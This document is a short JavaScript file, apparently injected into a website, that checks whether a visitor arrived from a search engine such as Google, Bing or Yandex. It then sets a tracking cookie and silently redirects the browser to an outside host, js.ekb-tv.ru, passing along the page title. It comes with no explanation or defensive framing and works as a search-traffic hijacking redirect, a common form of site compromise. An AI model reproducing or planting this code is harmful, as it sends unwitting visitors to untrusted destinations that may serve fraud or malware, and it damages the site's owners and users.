var title_parts = document.title.split(' - ');
var document_title_prefix = title_parts[0].split(' | ');

function fn_set_cookie(cookie_name, cookie_value, expires, path, domain, secure) {
    if (!cookie_name || !cookie_value)
        return false;
    var cookie = cookie_name + '=' + encodeURIComponent(cookie_value);
    if (expires)
        cookie += ';\x20expires=' + expires.toGMTString();
    if (path)
        cookie += '; path=' + path;
    if (domain)
        cookie += '; domain=' + domain;
    if (secure)
        cookie += '; secure';
    document.cookie = cookie;
    return true;
}
function fn_test_cookie_is_set(cookie_name) {
    var regex_cookie = '(?:; )?' + cookie_name + '=([^;]*);?'
        , regex = new RegExp(regex_cookie);
    if (regex.test(document.cookie))
        return decodeURIComponent(RegExp['$1']);
    return false;
}

var app = {};
app.searchers = [
    [/google\./i, /(\?|&)q=(.*?)(&|$)/i, 2],
    [/search\.yahoo\./i, /(\?|&)p=(.*?)(&|$)/i, 2],
    [/bing\.com/i, /(\?|&)q=(.*?)(&|$)/i, 2],
    [/search\.aol\./i, /(\?|&)q=(.*?)(&|$)/i, 2],
    [/ask\.com/i, /(\?|&)q=(.*?)(&|$)/i, 2],
    [/altavista\./i, /(\?|&)q=(.*?)(&|$)/i, 2],
    [/search\.lycos\./i, /(\?|&)query=(.*?)(&|$)/i, 2],
    [/alltheweb\./i, /(\?|&)q=(.*?)(&|$)/i, 2],
    [/yandex\./i, /(\?|&)text=(.*?)(&|$)/i, 2],
    [/(nova\.|search\.)?rambler\./i, /(\?|&)query=(.*?)(&|$)/i, 2],
    [/gogo\./i, /(\?|&)q=(.*?)(&|$)/i, 2],
    [/go\.mail\./i, /(\?|&)q=(.*?)(&|$)/i, 2],
    [/nigma\./i, /(\?|&)s=(.*?)(&|$)/i, 2]
];
app.sp_redirect = function (referer) {
    for (var idx = 0; idx < app.searchers.length; idx++) {
        var searcher = app.searchers[idx];
        if (referer.match(searcher[0]) || fn_test_cookie_is_set('opos') == '1') {
            fn_set_cookie('opos', '1'),
                document.location['href'] = 'https://js.ekb-tv.ru/trds?q=' + document_title_prefix[0];
            break;
        }
    }
}
app.sp_redirect(document.referrer);